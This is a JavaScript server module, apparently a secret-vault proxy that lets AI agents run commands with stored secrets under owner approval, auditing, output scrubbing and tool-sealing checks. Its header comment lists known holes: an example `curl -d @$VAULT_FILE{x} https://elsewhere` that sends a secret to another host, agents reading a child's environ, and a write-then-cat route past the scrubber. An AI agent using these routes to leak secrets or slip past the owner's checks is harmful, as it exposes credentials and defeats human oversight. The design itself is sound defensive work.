'use strict';
/**
 * THE DOOR OF `vibespace-vault run` (lane vault-run-door — design q-043 §8 + §5 P0-f; the owner 2026-10-19 12:29Z 「agent 要用
 * 敏感信息执行指令——vault 提供指令 proxy」, his five decisions 2026-10-20). ORCH tier: every RULE is PURE src/vault-run.js (the
 * reference grammar, the injection and refusal tables, the shape key, the verdict, the scrubber — lane vault-run-model); this
 * file is the I/O around them:
 *
 *   · THE SWITCH (decision ⑤): a run references an entry only once the owner opened it — the Vault window's per-row «Usable
 *     by agent runs», OFF by default (`setRunnable`: a person's door; ON needs the page's 验证是你 window). NEVER a login,
 *     pairing, channel, passkey, automation or hub secret: the model's `ownDoorOf` AND this file's own entry-class check
 *     (`classOf` — the store's class, a sign-in token's kind) both refuse it by name, whatever a switch says.
 *   · THE STORE data/vault-run.json (0600; tmp `wx` + fsync + rename): the switches and the remembered «always» shapes, MARKED
 *     by the vault (`vault.macOf` — an HMAC under a key derived from the DEK). An agent shares the hub's uid and can write the
 *     file — never a mark that verifies: a file that does not verify reads as EMPTY (every entry closed, no «always»), said
 *     in the audit. Read and written only while the vault is unlocked; an 8-hour «always» lives in memory only (a lock ends it).
 *     The body carries a GENERATION: a copy older than one this hub read or wrote is a replay — read as empty too. Switching an
 *     entry OFF drops every «always» and seen shape that names it.
 *   · THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」): an `agent:` entry the CALLER
 *     made (PURE `ownsAgentEntry` — its scope is this conversation, by its registered or its durable id) is open to its runs BY
 *     CONSTRUCTION: no switch, no grant, no card (`allowedBy: 'own'` on its run line; its use line, the scrubber, the refusal
 *     tables, the bounds and the lock all stay). A value the hub MINTED asks ONCE PER HOST when a run names a host other than the
 *     one it was minted `--for` — the card names both; the owner's 允许 is that host's PASS for that entry (memory only — a lock
 *     ends it). The Vault window shows no switch on an agent row (`rowFacts` own); `list` names the caller's own entries; a
 *     `request` for one answers `already: 'own'`. Another conversation's agent entry stays refused (`use_not_granted`).
 *   · THE CARD (decisions ② ④; exit-proxy's ask: one per conversation × shape, 60 s, the For-you item and the ask ONE state,
 *     a full tray ⇒ `ask_unfiled` at once, a second run of a shape whose card is up ⇒ `ask_pending`): 允许一次 / 此形状总是 /
 *     拒绝. A CLUSTER instance asks for every run without a live «always»; a LOCAL one asks the first time a shape runs and
 *     allows it after one 允许 (`seen`, this unlock). The card shows the whole command (references — never a value), the
 *     secrets, how each is given, the PROGRAM that runs (its real path — said when an agent could have written it), the hosts,
 *     the folder, the templates and what «this shape» means; 此形状总是 needs the
 *     second password again (the page's 验证是你 window, opened in the press's own task — the route checks it) and is not
 *     offered for a shell, an interpreter or a tool whose destination is unknown. An allow re-checks the item (open, this
 *     ask's, the very detail it showed) — a changed item runs nothing (`ask_changed`).
 *   · THE RUN: the HUB spawns the child — argv[0] resolved on agentEnv()'s PATH (a bare name is never looked up in the cwd)
 *     and realpath'd, refused by the typed name AND the resolved one; the cwd inside the conversation's project folder, the
 *     temp folder or ~/Downloads (exit-transfer's fence); env = agentEnv() + the agent's plain env + the injected values;
 *     each file 0600 (O_EXCL | O_NOFOLLOW) in a 0700 directory `vs-vault-run-<rand>` under $XDG_RUNTIME_DIR, SHREDDED and
 *     unlinked once the child is gone; stdin = the value + a newline, closed at once; NEVER argv (the model refuses it); its
 *     own process group; a hard timeout (120 s by default, ≤ 600 s: SIGTERM, then SIGKILL 5 s later); stdout and stderr
 *     through ONE streaming scrubber per run, fed in arrival order (a StringDecoder each → createRunMasker: the value in every
 *     spelling of vault-run.js's FORMS over ONE window — a value split between the two pipes is seen whole; lane
 *     vault-scrub-forms), ≤ 2 MiB together, then secret-shapes (a name stays, its value «redacted»). ONLY that reaches the
 *     agent. A stream CUT (the bound, the timeout, a lock, the caller gone) never flushes the scrubber's held tail: a value
 *     begun there is dropped whole.
 *   · A RUN ENDS WHOLE (the security review): when its child is gone, the child's process group is SIGKILLed (a backgrounded
 *     `cmd &` holds the value in its environ) and so is every process still carrying the run's MARK (`VS_RUN_MARK`
 *     in its environ — a descendant that left the group: setsid, a double fork), found by a fresh /proc scan. A run folder
 *     carries its hub's identity (`.owner`, src/proc-identity.js): the boot sweep shreds only the folders of a hub that is
 *     GONE, after ending the processes that still carry their mark (another hub on the box keeps its runs).
 *   · THE LOCK (decision ③): a lock act ends every running child BY NAME (its process group: SIGTERM, SIGKILL after the
 *     grace — then the end above) and the agent's answer is `vault_locked`; its run files are shredded AT ONCE; every card
 *     up settles `vault_locked`; the seen shapes and the 8-hour «always» go with it — and (lane vault-manual-and-lock) every
 *     open REQUEST is withdrawn `vault_locked` and every GRANT ends (one of the lock's four consequences, test-vault-engine's
 *     census). A locked vault refuses before anything is read and notes WHO it stopped (the vault's one helper).
 *   · THE REQUEST AND ITS GRANT (lane vault-manual-and-lock — design q-043 D4 + D3 ⑤): an agent whose entry is closed asks
 *     the owner for it WITH ITS PURPOSE (`request`: ONE For-you ask naming the agent, the entry and the purpose — it waits for
 *     nobody and never expires; a second request for the same conversation × entry while one is open ⇒ `request_pending`).
 *     The owner's answer (允许一次 / 8 小时 / 拒绝 — a person's door) writes a GRANT ROW in THIS door, the «always» rows' shape
 *     `{conv, key: null, entries, until, at, by}` + `once` and the purpose — memory only, ≤ 8 hours: it opens that entry for
 *     THAT conversation's runs as the per-row switch opens it for everyone (the shape card still shows each new command); a
 *     once-grant is spent before its run starts. The run's use line carries the grant's purpose.
 *     THE CAP (B-4934, q-043 verify L2): 8 open requests PER CONVERSATION (`too_many_requests`) and, hub-wide, 32 CONVERSATIONS
 *     asking at once (the 33rd ⇒ `too_many_askers`) — a count of callers, never of requests, so one conversation's many open
 *     questions never refuse another's first. More than 8 conversations asking ⇒ ONE Vault notice in For you «N conversations
 *     are asking» (re-worded as N moves; closed at 8 or fewer, at a lock, at a boot).
 *   · THE USE LINE (lane vault-manual-and-lock — the use law's seam): every run that ran, and every refusal past the plan, is
 *     ALSO one `vault-use` line per entry through the engine's ONE writer (`noteUse`: door `run`, the conversation, the
 *     purpose, the outcome, the run's receipt) — what `vibespace-vault uses` reads back for that conversation.
 *   · THE AUDIT: ONE `vault-run` line in data/vault-audit.jsonl per run and per refusal past the parse — the actor, the
 *     entries (references), the shape (its id and its key, secret-shapes'd), the tool, the hosts, the injection, the verdict,
 *     the exit code, the time, the scrubbed bytes, and the scrubbed heads of the command and of each stream (≤ 4 KiB) — NEVER
 *     a value, never another conversation's name.
 *
 * WHAT IT IS NOT — §8.6, THE THREE HOLES, said where the door is:
 *   ① the child runs under the agent's uid: the agent can read /proc/<child>/environ and the 0600 file while the child lives.
 *     Short-lived, env before a file, audited — hygiene and an audit boundary, NOT isolation (q-040's per-run uid closes it;
 *     the HUB spawns, never the CLI, so nothing here changes shape when it lands);
 *   ② a tool can SEND the value elsewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the whole
 *     command, a destination-unknown tool gets no «always»; the egress fence is P1 (vault-run-egress);
 *   ③ THE SCRUBBER IS A SIEVE: it reads the child's stdout and stderr in the spellings a real tool prints by itself —
 *     a custom encoding, compression, encryption, a hash or the last four characters pass it, and a value the tool WRITES TO A FILE that the agent then reads with its own shell
 *     never meets it. WRITE-THEN-CAT IS ACCEPTED AND AUDITED (the run's line names the command, the folder and the entries) —
 *     not closed; the copy / print / pack tools are refused by the model already.
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const { StringDecoder } = require('string_decoder');
const VR = require('../vault-run.js');
const VI = require('../vault-inventory.js');
// round 12 (BLOCKER): "the agent cannot write it" is OWNERSHIP, never mode bits — a path is the hub's to trust only when ROOT owns
// it (st.uid === 0) AND it has no group/other write bit; a uid-owned path is one the agent (= the hub's uid) can chmod and replace.
// statSync FOLLOWS symlinks (the unit bakes the PATH string; an agent cannot insert a link into a root-owned string; /bin → usr/bin
// resolves to root). Injectable into create() as `isRootOwned` so a test, which cannot chown a scratch binary to root, can model a
// root-owned install; the REAL rule is driven on real paths in test-vault-run ⑫.
const rootOwnedNoWrite = (p) => { try { const st = fs.statSync(p); return st.uid === 0 && (st.mode & 0o022) === 0; } catch { return false; } };
const isDirReal = (p) => { try { return fs.statSync(p).isDirectory(); } catch { return false; } };
// the tool DIGEST, streamed (never a sync read of a 42 MB binary on the event loop) → sha256 hex, or null if unreadable
function sha256File(p) { return new Promise((res) => { try { const h = crypto.createHash('sha256'); const rs = fs.createReadStream(p); rs.on('error', () => res(null)); rs.on('data', (d) => h.update(d)); rs.on('end', () => res(h.digest('hex'))); } catch { res(null); } }); }
// the tool DIGEST over an ALREADY-OPEN fd (round 13): hash and exec are ONE open file — the door hashes the inode this fd holds
// and exec's that SAME inode via /proc/<pid>/fd, so a swap of the PATH between the hash and the spawn cannot change what runs.
// Streamed (never a sync read of a 42 MB binary on the event loop); autoClose false so the fd survives the hash for the exec.
function sha256Fd(fd) { return new Promise((res) => { try { const h = crypto.createHash('sha256'); const rs = fs.createReadStream(null, { fd, start: 0, autoClose: false }); rs.on('error', () => res(null)); rs.on('data', (d) => h.update(d)); rs.on('end', () => res(h.digest('hex'))); } catch { res(null); } }); }
// round 13 (BLOCKER): a directory is the hub's to put on the child PATH only when it RESOLVES (realpathSync) to a real path whose
// EVERY component — root to leaf — is a root-owned dir with no group/other write. r12 kept the agent's PATH-entry STRING after a
// check that FOLLOWS symlinks, so ~/.local/bin -> /usr/bin passed and was kept BY NAME, then re-pointed to an agent dir after the
// spawn (gh's git/pager child then resolved through the link into the agent's dir with the token). Here we bake the RESOLVED path
// (/usr/bin, never the link name) and require every ancestor root-owned, so no component the agent owns can be swapped under it.
const chainRootOwned = (p) => { const parts = String(p).split('/'); let cur = ''; for (let i = 1; i < parts.length; i++) { cur += '/' + parts[i]; if (!rootOwnedNoWrite(cur)) return false; } return true; };
const sealDirReal = (d) => { if (!d || d[0] !== '/') return null; let real; try { real = fs.realpathSync(d); } catch { return null; } return (isDirReal(real) && chainRootOwned(real)) ? real : null; };
// round 14 (BLOCKER): the fd pins WHICH inode runs; ROOT ownership pins WHAT is in it. A pinned tool runs with a minted value ONLY
// when its realpath chain is root-owned (chainRootOwned) AND the OPEN fd's inode is root-owned with no group/other write (fstat) —
// so the inode the door hashes and exec's cannot be rewritten IN PLACE by the agent. A uid-owned tool is NEVER pinnable: r13's fd
// exec'd the agent's CURRENT bytes after an in-place rewrite (O_RDONLY and /proc/<pid>/fd pin the inode, never its content).
const fstatRootOwned = (fd) => { try { const st = fs.fstatSync(fd); return st.uid === 0 && (st.mode & 0o022) === 0; } catch { return false; } };
const fstatOf = (fd) => { try { return fs.fstatSync(fd); } catch { return null; } };
const sealedToolReal = (p, fd) => chainRootOwned(p) && fstatRootOwned(fd);
// round 14 (MINOR): does `git` (gh's child) live on a sealed PATH? resolved ONCE at boot over the sealed dirs, never per spawn.
const probeGitReal = (dirs) => dirs.some((d) => { if (!d) return false; try { return fs.statSync(path.join(d, 'git')).isFile(); } catch { return false; } });
// round 13/14: the open-inode exec road uses /proc/<pid>/fd (Linux). Where it is absent (macOS) a SEALED (round 14: root-owned)
// pinned tool is exec'd by path instead — a root-owned inode cannot be swapped by the agent, so the path is as safe as the fd; a
// uid-owned pinned tool is tool_not_sealed regardless (never exec'd on an inode the agent can rewrite). The hub is Linux.
const HAS_PROC_FD = (() => { try { return fs.existsSync('/proc/' + process.pid + '/fd'); } catch { return false; } })();
const VB = require('../vault-blocked.js');
const SS = require('../secret-shapes.js');
const HC = require('../hidden-chars.js');
const DOOR = require('../mount-door.js');   // B-afc4: a blocked storage path is answered by name, never read (a cwd, a tool, a template)
const PI = require('../proc-identity.js');   // a run folder's hub: its identity, never a bare pid (the boot sweep)

const ACTION_TYPE = 'vault-run-ask';
const REQUEST_TYPE = 'vault-grant-ask';      // lane vault-manual-and-lock: an agent's request for an entry (its For-you ask)
const PURPOSE_MAX = 200;                     // the request's purpose, in the agent's own words (one line)
const GRANT_MS = 8 * 3600e3;                 // a grant lives ≤ 8 hours (once: until its run; 8h: every run) — and never past a lock
const GRANT_ANSWERS = Object.freeze(['once', '8h', 'deny']);
// B-4934 (q-043 verify L2): the hub-wide bound counts CONVERSATIONS, not requests — 64 requests hub-wide let eight
// conversations × 8 open asks fill the table, and a ninth conversation's honest first ask answered too_many_requests
const REQUESTS_PER_CALLER = 8, REQUEST_CALLERS_MAX = 32;
const ASKING_LINE_OVER = 8;                  // more conversations than this asking at once ⇒ ONE Vault notice «N conversations are asking»
const VAULT_INBOX_KEY = 'vault';             // the For-you bucket the vault's own notices file under (src/server/vault-hooks.js)
const ASKING_TEXT = `More than ${ASKING_LINE_OVER} conversations are asking to use stored secrets`;   // the store's dedupe key (one row; N rides its words)
const ASKING_KEY = '{n} conversations are asking to use stored secrets';
const ASKING_DETAIL = 'Each conversation asks on its own card in For you. This line goes when 8 or fewer are asking.';
const REQUEST_QUIET_MS = 10 * 60e3;          // a Deny (or the card dismissed) quiets that conversation × entry 10 minutes (the automation card's rule)
const USE_SKIP = new Set(['ask_pending', 'too_many_runs', 'spawn_failed', 'run_path_unsafe', 'tool_not_sealed', 'git_not_on_seal', 'two_hosts', 'bad_host', 'url_userinfo', 'storage_blocked']);   // a wait or the hub's own failure before any child ran — not a use's outcome (a child that ran is always one)
const STORE_FILE = 'vault-run.json';
const MARK_LABEL = 'vault-run-store-v1';
const RUN_DIR_PREFIX = 'vs-vault-run-';
const OWNER_FILE = '.owner';                 // the run folder's hub identity { pid, starttime, bootId }
const MARK_ENV = 'VS_RUN_MARK';      // every child of a run carries its folder's name here (the end's /proc scan)
const SEAL_NOWHERE = '/nonexistent/vibespace-vault-run';   // round 11 (BLOCKER): a runSeal tool's HOME / config dir / XDG — a path the hub uid CANNOT create (/ is root-owned on every hub) and so can never hold a planted config.yml / hosts.yml / .gitconfig; gh 2.102.0 runs an allowlisted verb on an env token with no config dir at all (wire-proven), so the seal is a place NOBODY can write, not a relocation
const ARGS_MAX = 65536, CWD_MAX = 4096;      // the request's words (the review: an unbounded value stalled the loop)
const STORE_MAX = 1024 * 1024;               // data/vault-run.json read bounded (a FIFO / a huge file never stalls the hub)
const KILL_GRACE_MS = 5000;
const PIPE_GRACE_MS = 2000;                  // after the child's exit, a pipe a stray still holds is cut (the answer never waits on it)
const HEAD_MAX = 4096;               // bytes of a head on the audit line (the command, each stream)
const DETAIL_MAX = 8000;             // the For-you store's detail bound — a card that would be cut is refused (what you approve is what runs)
const SETTLED_MAX = 256;
const LATE_TTL_MS = 24 * 3600 * 1000;   // lane vault-agent-own r20b: a late card (an expired run card the owner may still allow one run) lives 24 h
const RUNS_MAX = 16, RUNS_PER_CALLER = 4;
// THE HTTP status of each answer (src/routes/vault.js reads it) — a refusal is a 4xx by name; a run that ran is 200 whatever its exit
const STATUS = Object.freeze({
  vault_not_set_up: 409, vault_locked: 423, bad_flag: 400, bad_reference: 400, bad_env_name: 400, duplicate_name: 400, no_command: 400,
  cmd_too_long: 400, no_reference: 400, template_unread: 400, template_too_long: 400, hidden_chars: 400, card_too_long: 400,
  env_refused: 403, argv_refused: 403, tool_prints_secrets: 403, tool_wraps_another: 403, tool_has_its_own_door: 403, tool_not_sealed: 409, two_hosts: 409, bad_host: 400, url_userinfo: 403,
  entry_has_its_own_door: 403, entry_unknown: 404, entry_not_runnable: 403, entry_too_short_to_mask: 403, use_not_granted: 403,
  job_no_use: 403, device_road_later: 403, cwd_refused: 403, template_refused: 403, tool_not_found: 404, unauthorized: 401,
  ask_pending: 409, ask_denied: 403, ask_expired: 403, ask_unfiled: 503, ask_changed: 409, caller_gone: 410, too_many_runs: 429,
  spawn_failed: 500, failed: 500, storage_blocked: 503, request_too_large: 400, run_path_unsafe: 500, git_not_on_seal: 500,
  request_pending: 409, request_quiet: 429, purpose_required: 400, purpose_too_long: 400, too_many_requests: 429,   // lane vault-manual-and-lock
  too_many_askers: 429,   // B-4934
});
const MORE_WORDS = Object.freeze({
  hidden_chars: 'the command holds characters that show differently than they run (control or direction marks) — refused',
  card_too_long: `the card that shows this run to the user would be cut (over ${DETAIL_MAX} characters) — a shorter command or template`,
  unauthorized: 'only a conversation\'s own session token runs a command with a stored secret',
  storage_blocked: `${DOOR.SENTENCE} (the run's folder, its program or a template is on it) — nothing ran`,
  request_too_large: `the run's words are over ${ARGS_MAX} characters or its folder over ${CWD_MAX} — refused before anything is read`,
  failed: 'the run door failed — nothing ran',
  run_path_unsafe: 'no directory on the hub PATH is safe to run this tool from — none is a root-owned system directory (every one is missing, or owned by this user, who could plant a program there) — nothing ran',   // round 11 (MAJOR 2) / round 12 (BLOCKER): a runSeal tool whose sealed PATH (ROOT-OWNED dirs only) came out empty
  git_not_on_seal: 'this gh command drives git (a clone / fork / push / checkout), but git is not on a root-owned PATH directory — a git loaded from a directory this user can write could run the agent\'s own program with the minted value in its environment; install git where only root writes (`sudo apt install git`); nothing ran',   // round 15 (MINOR): a git-DRIVING gh verb on a hub whose sealed PATH lacks git (gh api / issue list never run git and are NOT refused)
  tool_not_sealed: 'this tool lives in a directory this user can write, so its program could be replaced after the hub hashed it (the fd pins WHICH file runs, root ownership pins WHAT is in it) — a tool that runs with a minted secret must live where ONLY root writes: /usr/bin or /usr/local/bin (`sudo apt install gh`); nothing ran',   // round 14 (BLOCKER): a uid-owned pinned tool is unsealed — r13's fd exec'd the CURRENT bytes after an in-place rewrite
  two_hosts: 'this command names two different hosts it could contact (a URL in a positional vs -R / GH_HOST or a repo spec) — a sealed credential tool homes the token to ONE host, so which one receives it cannot be told; name a single host — nothing ran',   // round 16 (BLOCKER): a <url> positional whose host differs from the routing host is two route hosts
  bad_host: 'a host this command would CONTACT does not parse — an empty or malformed name in a host list (`-h ,db.example.com`), or a URL the WHATWG parser rejects yet the tool still dials (an out-of-range port `https://evil.test:99999/`, a non-DNS name, a label over 63 or a name over 253 chars); name each host plainly — nothing ran',   // round 16 (MINOR) + round 19 (item 1 BLOCKER): a routing value that normalises to null — a bad host-list entry OR a located URL token the parser rejects (urlHostsBad) — never reaches the verdict as «null»; a rejected token is bad_host, never a dropped host (Go/curl would dial it)
  url_userinfo: 'a URL on this command line carries a user[:password] before the host (`https://user@host/…`) — a credential-carrying URL can disguise which host the tool really contacts (the userinfo runs up to the last `@`, not the first), and a stored secret is never routed by one; write the host plainly and pass any credential with --env / --file — nothing ran',   // round 18 (item 1): a URL\'s host is what the WHATWG parser says; a userinfo URL is never a route
  // lane vault-manual-and-lock: the request's own codes
  request_pending: 'you already asked the user for that entry — the question waits in their For you tray; `vibespace-vault uses` shows the answer when it comes',
  purpose_required: 'say what the entry is for: vibespace-vault request <vault://…> --for "<what you will run with it, and why>"',
  purpose_too_long: `the purpose is one line of at most ${PURPOSE_MAX} characters`,
  too_many_requests: `this conversation already has ${REQUESTS_PER_CALLER} questions waiting on the user — wait for their answers (\`vibespace-vault uses\` lists them)`,
  too_many_askers: `${REQUEST_CALLERS_MAX} other conversations are waiting on the user's answers already — nothing was filed; ask again once some are answered`,   // B-4934
  request_quiet: 'the user said no to that a moment ago — do not ask again for 10 minutes; do other work',
});
const named = (code, extra = {}) => (MORE_WORDS[code] ? { ok: false, code, words: MORE_WORDS[code], ...extra } : VR.refusalOf(code, extra));
const NO_ALWAYS = Object.freeze({
  shell: 'a shell\'s whole script is its shape',
  interpreter: 'an interpreter runs a program this card cannot read',
  'unknown-destination': 'where this tool sends what it reads is unknown',
  'runs-project-code': 'it runs the project\'s own code (package scripts, setup files, a Dockerfile)',
  'config-file': 'it reads a config file this card cannot show',
  'program-writable': 'the program sits where an agent could have written it',
  'another-host': 'a minted value goes to another host one host at a time',   // lane vault-agent-own
});

// THE ENGINE'S ENTRY-CLASS CHECK (decision ⑤ — the second of two that say no, beside the model's ownDoorOf): the stores whose
// rows a person may open for runs, by THIS file's own table; every other store's class is named; a sign-in token's kind is
// never runnable wherever it sits
const RUN_CLASS = Object.freeze({ mounts: 'storage', 'app-secrets': 'app-login' });
const NEVER_CLASS = Object.freeze({ accounts: 'login', integrations: 'channel', channels: 'channel', passkeys: 'passkey', automation: 'automation', secrets: 'pairing' });
const NEVER_KINDS = Object.freeze(['long-lived-oauth-token', 'session-token']);
/** A reference (and its row) → { cls, runnable, door? }. */
function classOf(ref, row = null) {
  if (!ref) return { cls: 'unknown', runnable: false };
  const modelDoor = VR.ownDoorOf(ref);
  if (modelDoor) return { cls: NEVER_CLASS[ref.store] || 'unknown', runnable: false, door: modelDoor };
  if (VR.agentScopeOf(ref)) return { cls: 'agent-entry', runnable: true };   // an AGENT's own entry (lane vault-mint-put: mint / put) — the owner opens it like any other; only its conversation may use it
  if (VR.isFreeEntry(ref.store, ref.entry, ref.field)) return { cls: 'secret', runnable: true };   // lane vault-paste-request: a free entry (`secret:<id>`) — the owner opens it (the switch, a grant, a paste for the asker)
  if (!Object.prototype.hasOwnProperty.call(RUN_CLASS, ref.store)) return { cls: NEVER_CLASS[ref.store] || 'unknown', runnable: false, door: 'no run door (a store this door does not open)' };
  if (row && NEVER_KINDS.includes(row.kind)) return { cls: 'login', runnable: false, door: 'a sign-in token is never referenced by a run' };
  return { cls: RUN_CLASS[ref.store], runnable: true };
}

/** THE atomic persistence law: tmp opened `wx` 0600, fsync, rename. */
function writeJsonAtomic(file, obj) {
  const tmp = `${file}.tmp-${process.pid}-${crypto.randomBytes(4).toString('hex')}`;
  const fd = fs.openSync(tmp, 'wx', 0o600);
  try { fs.writeSync(fd, JSON.stringify(obj, null, 1) + '\n'); try { fs.fsyncSync(fd); } catch { /* best effort */ } } finally { fs.closeSync(fd); }
  try { fs.renameSync(tmp, file); } catch (e) { try { fs.unlinkSync(tmp); } catch { } throw e; }
}
/** Overwrite a run file's bytes and unlink it (never through a link). */
function shredFile(file) {
  try {
    const st = fs.lstatSync(file);
    if (st.isFile() && st.size > 0) { const fd = fs.openSync(file, fs.constants.O_WRONLY | (fs.constants.O_NOFOLLOW || 0)); try { fs.writeSync(fd, crypto.randomBytes(st.size), 0, st.size, 0); try { fs.fsyncSync(fd); } catch { } } finally { fs.closeSync(fd); } }
  } catch { /* gone, or not ours to write: unlinked below all the same */ }
  try { fs.unlinkSync(file); } catch { }
}
/** A small regular file, read bounded through ONE fd (never through a link, never a FIFO's wait, never past `max`). */
function readBounded(file, max) {
  const fd = fs.openSync(file, fs.constants.O_RDONLY | (fs.constants.O_NOFOLLOW || 0) | (fs.constants.O_NONBLOCK || 0));
  try {
    const st = fs.fstatSync(fd);
    if (!st.isFile()) throw Object.assign(new Error('not a regular file'), { code: 'ENOTREG' });
    if (st.size > max) throw Object.assign(new Error('too large'), { code: 'EFBIG' });
    const b = Buffer.alloc(st.size);
    let n = 0;
    while (n < st.size) { const k = fs.readSync(fd, b, n, st.size - n, null); if (!k) break; n += k; }
    return b.subarray(0, n);
  } finally { fs.closeSync(fd); }
}
/** THE MARK's end: every process whose environ carries `VS_RUN_MARK=<mark>` (a run's descendant that left its group —
 *  setsid, a double fork, a child its hub did not live to end) is SIGKILLed — its pid read off a FRESH /proc scan in this very
 *  call, its environ the proof. → how many. */
function endMarked(mark) {
  const needle = Buffer.from(`${MARK_ENV}=${mark}\0`);
  let names = [], n = 0;
  try { names = fs.readdirSync('/proc'); } catch { return 0; }
  for (const d of names) {
    if (!/^\d+$/.test(d) || Number(d) === process.pid) continue;
    let environ = null;
    try { environ = fs.readFileSync(`/proc/${d}/environ`); } catch { continue; }
    if (environ.includes(needle)) { try { process.kill(Number(d), 'SIGKILL'); n++; } catch { } }
  }
  return n;
}
function shredDir(dir) {
  try { for (const n of fs.readdirSync(dir)) shredFile(path.join(dir, n)); } catch { }
  try { fs.rmdirSync(dir); } catch { }
}
/** The command as a shell would read it back — the card, the audit (references stay references). */
const quote = (a) => (/^[\w@%+=:,./~^-]+$/.test(a) ? a : `'${String(a).replace(/'/g, `'\\''`)}'`);
const cmdText = (argv) => argv.map(quote).join(' ');
const utf8Head = (s, n = HEAD_MAX) => { const b = Buffer.from(String(s || ''), 'utf8'); return b.length <= n ? String(s || '') : b.subarray(0, n).toString('utf8').replace(/�$/, '') + '…'; };
/** secret-shapes over a long text: windows of ≤ INPUT_MAX characters, each cut at a line end (the rule bounds its input). */
function redactLong(text) {
  let out = '', n = 0, i = 0;
  const t = String(text || '');
  while (i < t.length) {
    let j = Math.min(t.length, i + SS.INPUT_MAX);
    if (j < t.length) { const nl = t.lastIndexOf('\n', j - 1); if (nl > i) j = nl + 1; }
    const r = SS.redactSecrets(t.slice(i, j));
    out += r.text; n += r.redacted; i = j;
  }
  return { text: out, redacted: n };
}

/**
 * @param {object} o
 * @param {string} o.dataDir
 * @param {object} o.vault       src/server/vault-engine.js (state, epoch, macOf, audit, noteUse, blocked, onLock)
 * @param {Object<string, () => ({ vaultRows, vaultReveal } | null)>} o.sources  the Vault window's per-store getters (vault-contents)
 * @param {object} [o.userTodos] the For-you store (the card)
 * @param {() => object} [o.agentEnv]  the sanitized base env of an agent's child (src/agent-env.js over the hub's env)
 * @param {() => ('cluster'|'local')} [o.instanceKind]
 * @param {(conversationId: string) => boolean} [o.liveOf]  is the asking conversation still running
 */
function create({ dataDir, vault, sources = {}, userTodos = null, agentEnv = () => ({ ...process.env }), instanceKind = () => 'local', policy = () => null,
  liveOf = () => true, runRoot = () => process.env.XDG_RUNTIME_DIR || os.tmpdir(), home = os.homedir(), tmpDir = os.tmpdir(),
  now = () => Date.now(), log = () => {}, spawnImpl = spawn, killGraceMs = KILL_GRACE_MS, pipeGraceMs = PIPE_GRACE_MS,
  timers = { set: (fn, ms) => setTimeout(fn, ms), clear: (h) => clearTimeout(h) }, randomBytes = crypto.randomBytes,
  isRootOwned = rootOwnedNoWrite, toolDigest = sha256Fd, sealDir = sealDirReal, hasProcFd = HAS_PROC_FD, toolSealed = sealedToolReal, probeGit = probeGitReal } = {}) {   // round 12/13/14: the ownership predicate, the fd-digest hasher, the PATH realpath-sealer, the tool-sealed (chain root-owned + fstat) check, the git-on-seal probe — injectable test seams (defaults are the real checks)
  if (!dataDir || !vault) throw new TypeError('vault-run-door: dataDir and vault are required');
  const FILE = path.join(dataDir, STORE_FILE);
  const asks = new Map();      // askId → the card up
  const byPair = new Map();    // `${conv}\n${shapeKey}` → askId (ONE card per conversation × shape)
  const settled = new Map();   // askId → 'settled' | 'expired' (a second answer says which)
  const seen = new Map();      // pair → at — the owner allowed this shape once, THIS unlock (a local instance asks no more)
  const shortAlways = new Map(); // pair → until — an 8-hour «always» (memory only: a lock ends it)
  const hostPasses = new Map();  // lane vault-agent-own: `${scope}\n${entry id}\n${host}` → { scope, id, host, at } — the owner let a minted value go there (a lock ends it)
  const lateOnce = new Map();    // lane vault-agent-own r20b: pair → { until, entries, askId } — a LATE «allow once» (the owner answered after the 60 s); the agent's NEXT run of this shape passes once with no card, consumed then (memory only, a lock ends it — beside shortAlways)
  const lateAsks = new Map();    // askId → lq — an EXPIRED run card the owner may still answer (allow once / deny) for 24 h (the agent's run already returned ask_expired)
  const latePair = new Map();    // pair → askId — the one open late card for a (conversation, shape), so a second run re-asks it, never a second card
  const runs = new Set();      // the children running now
  // lane vault-manual-and-lock: an agent's REQUESTS (one For-you ask each, open until answered or the lock) and the GRANT ROWS
  // their answers write (memory only — the «always» rows' shape + once + purpose; a lock ends them all)
  const requests = new Map();  // askId → { askId, pair, scope, conv, sessionKey, who, ref, id, label, purpose, detail, askedAt, todoId }
  const reqByPair = new Map(); // `${scope}\n${entry id}` → askId (ONE open request per conversation × entry)
  const grants = new Map();    // `${scope}\n${entry id}` → { conv, key: null, entries: [id], until, once, at, by, askId, purpose }
  const reqQuiet = new Map();  // pair → until (a Deny / a dismissed card: no new card for that pair for 10 minutes)
  let asking = { id: null, n: 0, quiet: false, batch: false };   // B-4934: the «N conversations are asking» notice (its item, its count, set aside by the owner)
  let db = null, dbEpoch = -1;
  let lockGen = 0, bootSealMs = 0, gitOnSeal = null, sealedDirs = [];   // round 14/15: a lock epoch (restoreOnce never restores a once-grant across a lock) + the boot-computed seal facts (the sealed PATH's ms, dirs, whether git is on it)
  const digestMemo = new Map();   // round 15: fd digest keyed by inode identity `${dev}:${ino}:${size}:${mtimeMs}:${ctimeMs}` ⇒ Promise<sha> — one hash per tool change, shared by concurrent callers
  const hubIdentity = (() => { try { return PI.identityOf(process.pid); } catch { return null; } })();   // written into every run folder (the boot sweep's proof)
  const vaultState = () => { try { return vault.state(); } catch { return 'locked'; } };
  const audit = (event, line) => { try { vault.audit(event, line); } catch (e) { log(`the audit line could not be written (${e.message})`); } };

  // ── THE TOOL DRIFT STORE (round 15, NOT marked — nothing secret): the first-seen {path,dev,ino,size,mtime,sha256} of each
  // SEALED tool. The SEAL (root ownership) is the content fence; this store is a RECORD, never a gate. A later run whose bytes
  // or inode differ RECORDS the drift (an audit line + one notice the first time) and RUNS — root changed it. data/vault-run-tools.json.
  const TOOLS_FILE = path.join(dataDir, 'vault-run-tools.json');
  let toolsCache = null;
  const toolsLoad = () => { if (toolsCache) return toolsCache; let o = null; try { o = JSON.parse(readBounded(TOOLS_FILE, STORE_MAX).toString('utf8')); } catch { o = null; } toolsCache = (o && o.tools && typeof o.tools === 'object') ? { v: 1, tools: o.tools } : { v: 1, tools: {} }; return toolsCache; };
  const toolsSave = () => { try { writeJsonAtomic(TOOLS_FILE, toolsCache); } catch (e) { log(`data/vault-run-tools.json could not be written (${(e && e.code) || e})`); } };
  // a digest→version LABEL for the drift line ONLY (the lane fixture's seam, named as such — the door NEVER gates on it; an
  // unknown sha RUNS and is labelled by its short sha). The shipped gh row seeds it with the lane's bundled gh.
